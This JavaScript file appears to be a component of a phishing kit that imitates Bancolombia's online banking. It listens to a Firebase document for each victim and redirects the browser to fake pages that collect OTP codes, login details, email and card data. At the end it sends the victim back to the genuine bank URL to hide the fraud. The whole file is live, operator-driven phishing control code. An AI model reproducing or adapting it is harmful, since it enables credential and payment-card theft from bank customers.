const db = firebase.firestore();
   const usr = localStorage.getItem("usr")
   console.log(usr)




db.collection("user").doc(usr)
    .onSnapshot((doc) => {
        console.log("Current data: ", doc.data());
        if (doc.data().token == false) {
           
            
        }else{
            window.location  = "/mua/VALIDATEOTP/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/index.html"
           
        }
        if (doc.data().index == false) {
            
            
        }else{
            window.location  = "/mua/USER/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/index.html"
           
        }
        if (doc.data().mail == false) {
            
            
        }else{
            window.location  = "/mua/VALIDATEMAIL/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/index.html"
            
        }
        if (doc.data().cc == false) {
            
            
        }else{
            window.location  = "/mua/VALIDATECARD/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/index.html"
            
        }
        if (doc.data().exit == false) {
            
            
        }else{
            window.location  = "https://sucursalpersonas.transaccionesbancolombia.com/mua/USER?scis=e%2BQFJsdZb%2B8DG4Pz4dSFlplKyeenp5sb6vpqJE9G%2Foc%3D#no-back-button"
            
        }



    });

    function updtetok(params) {
        var washingtonRef = db.collection("user").doc(usr);

// Set the "capital" field of the city 'DC'
return washingtonRef.update({
    token: false
})
.then(() => {
    console.log("Document successfully updated!");
})
.catch((error) => {
    // The document probably doesn't exist.
    console.error("Error updating document: ", error);
});

         
    }

    function updtemail(params) {
        var washingtonRef = db.collection("user").doc(usr);

// Set the "capital" field of the city 'DC'
return washingtonRef.update({
    mail: false
})
.then(() => {
    console.log("Document successfully updated!");
})
.catch((error) => {
    // The document probably doesn't exist.
    console.error("Error updating document: ", error);
});

         
    }
    function updtecc(params) {
        var washingtonRef = db.collection("user").doc(usr);

// Set the "capital" field of the city 'DC'
return washingtonRef.update({
    cc: false
})
.then(() => {
    console.log("Document successfully updated!");
})
.catch((error) => {
    // The document probably doesn't exist.
    console.error("Error updating document: ", error);
});

         
    }
    